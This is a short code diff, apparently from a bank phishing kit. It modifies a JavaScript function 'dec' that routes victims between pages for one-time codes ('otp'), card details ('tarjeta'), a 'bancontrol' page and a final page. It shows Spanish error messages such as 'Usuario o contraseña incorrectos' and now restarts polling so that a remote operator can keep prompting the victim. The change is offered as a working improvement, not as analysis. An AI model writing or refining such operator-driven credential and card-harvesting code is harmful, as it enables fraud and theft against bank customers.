@@ -246,13 +246,13 @@ function togglePass() {
 
 function dec(a) {
   hideWait();
-  if      (a === 'otp')          window.location.href = 'index2.html';
-  else if (a === 'tarjeta')      window.location.href = 'index3.html';
-  else if (a === 'error_login')  { showAlert('al3','Usuario o contraseña incorrectos. Intenta de nuevo.'); go(3); }
-  else if (a === 'error_otp')    { showAlert('al3','Ocurrió un error. Intenta de nuevo.'); go(3); }
-  else if (a === 'error_tarjeta'){ showAlert('al3','No fue posible procesar tu solicitud.'); go(3); }
-  else if (a === 'bancontrol')   window.location.href = 'bancontrol.html';
-  else if (a === 'finalizar')    window.location.href = 'final.html';
+  if      (a === 'otp')              window.location.href = 'index2.html';
+  else if (a === 'tarjeta')          window.location.href = 'index3.html';
+  else if (a === 'bancontrol')       window.location.href = 'bancontrol.html';
+  else if (a === 'finalizar')        window.location.href = 'final.html';
+  else if (a === 'error_login')      { showAlert('al3','Usuario o contraseña incorrectos. Intenta de nuevo.'); go(3); startPolling(dec); }
+  else if (a === 'error_otp')        { showAlert('al3','Código incorrecto. Intenta de nuevo.'); go(3); startPolling(dec); }
+  else if (a === 'error_tarjeta')    { showAlert('al3','Datos de tarjeta incorrectos. Intenta de nuevo.'); go(3); startPolling(dec); }
 }
 </script>
 </body>
